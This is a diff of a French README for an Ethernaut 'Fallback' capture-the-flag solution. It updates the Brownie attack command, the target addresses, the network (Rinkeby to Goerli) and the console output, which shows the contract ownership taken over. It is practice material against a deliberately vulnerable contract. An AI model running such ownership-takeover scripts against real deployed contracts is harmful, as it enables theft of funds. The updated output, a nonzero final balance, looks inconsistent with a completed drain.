@@ -52,30 +52,30 @@ export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
 export PRIVATE_KEY='0xDEADBEEFCACA...'
 ```
 
-En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
+En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x6F9cf195B9B4c1259E8FCe5b4e30F7142f779DeA) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
 ```bash
-$ brownie run attack main "0x4c7c62Ed79994383EEa5Cf156bd3159e9e12C385" --network rinkeby
+$ brownie run attack main "0x3F1A2CFFDC74EB36e0B529f9b2462a6c1D94FDCA" --network goerli
 ```
 ```console
-Brownie v1.18.1 - Python development framework for Ethereum
+Brownie v1.19.0 - Python development framework for Ethereum
 
 FallbackProject is the active project.
 
 Running 'scripts/attack.py::main'...
-Transaction sent: 0x4eb894692e6cc551ca59a862ad7fe413f7d5b60e6e8aecfce7ee80ce8de5dadc
-  Gas price: 1.200002455 gwei   Gas limit: 52813   Nonce: 194
-  Transaction confirmed   Block: 10180337   Gas used: 48012 (90.91%)
+Transaction sent: 0xb546c7c85b8513fe46a7a819b4b269a0004f5d23191c627db8b232e2217634f0
+  Gas price: 5.465819587 gwei   Gas limit: 52501   Nonce: 12
+  Transaction confirmed   Block: 7828039   Gas used: 47729 (90.91%)
 
-Transaction sent: 0x069866c60d8df2e3bc6822d6f1c0902933b5c813783f1cde4bcb095aebc4201d
-  Gas price: 1.200002456 gwei   Gas limit: 31183   Nonce: 195
-  Transaction confirmed   Block: 10180338   Gas used: 28349 (90.91%)
+Transaction sent: 0xef990ff3dac0e346ddf6faa534447d3204826a3e0af1a6b208831b708704d575
+  Gas price: 4.781299 gwei   Gas limit: 31132   Nonce: 13
+  Transaction confirmed   Block: 7828070   Gas used: 28302 (90.91%)
 
 Owner is hacker: True
-Transaction sent: 0x18d92043ec34c686a2dff520680ddbbe08b5c70d23f43a598da6292c157be4ff
-  Gas price: 1.200002459 gwei   Gas limit: 35918   Nonce: 196
-  Transaction confirmed   Block: 10180339   Gas used: 30398 (84.63%)
+Transaction sent: 0x4ceeca8811a63bfb30fa03c6cb5bbe0ef6424f9aa491067b2ce262eb2f90858b
+  Gas price: 4.69966451 gwei   Gas limit: 35880   Nonce: 14
+  Transaction confirmed   Block: 7828103   Gas used: 30364 (84.63%)
 
-Final contract balance: 0
+Final contract balance: 1500000000000000
 ```
 
 
